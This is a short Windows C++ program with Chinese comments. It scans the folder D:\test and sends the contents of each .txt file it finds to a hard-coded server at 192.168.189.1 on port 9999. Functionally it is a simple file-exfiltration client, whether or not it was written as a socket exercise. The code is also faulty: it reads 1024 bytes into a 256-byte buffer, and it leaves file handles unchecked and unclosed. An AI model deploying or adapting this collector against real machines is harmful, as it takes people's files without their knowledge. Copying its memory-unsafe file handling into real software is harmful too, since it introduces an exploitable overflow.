#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <winsock2.h>
using std::cout;
using std::endl;

#pragma comment(lib,"ws2_32.lib")


int SendToServer(const char* path)
{
	// 初始化套接字库
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1, 1);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		printf("WSAStartup errorNum = %d\n", GetLastError());
		return err;
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1) {
		printf("LOBYTE or BIBYTE error = %d\n", GetLastError());
		WSACleanup();
		return -1;
	}

	SOCKET sockClt = socket(AF_INET, SOCK_STREAM, 0);
	if (sockClt == INVALID_SOCKET) {
		printf("socket error: %d\n", GetLastError());
		return -1;
	}
	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("192.168.189.1");
	addr.sin_port = htons(9999);
	// 进行连接
	if (connect(sockClt, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		printf("connect error: %d\n", GetLastError());
		return -1;
	}

	// 和服务端只进行一次通信
	std::cout << "client connected..." << std::endl;

	// 读取文件内容
	char sendBuf[256] = { 0 };
	FILE* fp = fopen(path, "rb");
	int len = fread(sendBuf, 1024, 1,fp);
	if (len < 0) {
		cout << "fread error:" << GetLastError();
		return -1;
	}
	// 发送数据	
	send(sockClt, sendBuf, strlen(sendBuf) + 1, 0);
	closesocket(sockClt);
	WSACleanup();
	return 0;

}

// 查看该目录下的文件，符合文件类型的内容发送到服务端
void ViewFiles(const char* dirPath)
{
	// 遍历该路径path下所有的文件
	WIN32_FIND_DATA filesData;
	HANDLE hFile; // 用句柄来标识文件

	char szFilePath[MAX_PATH] = { 0 }; // MAX_PATH 表示文件路径的最大长度
	strcpy(szFilePath, dirPath);
	strcat(szFilePath, "\\*"); // 这里加*是匹配所有的文件，方便下面查找到第一个文件

	// 查找并返回第一个文件句柄
	hFile = FindFirstFile(szFilePath, &filesData);

	// 遍历所有的文件
	do 
	{
		char path[256] = { 0 };
		strcpy(path, dirPath);
		strcat(path, "\\");
		strcat(path, filesData.cFileName);
		cout << path << endl;
		// 如果文件类型是txt，则发送该文件的内容到服务端
		if (strstr(path, ".txt")) {
			SendToServer(path);
		}

	} while (FindNextFile(hFile, &filesData)); // FindNextFile找不到下个文件返回NULL
	cout << "所有文件列举完成..." << endl;
}



int main()
{
	ViewFiles("D:\\test");
	system("pause");
	return 0;
}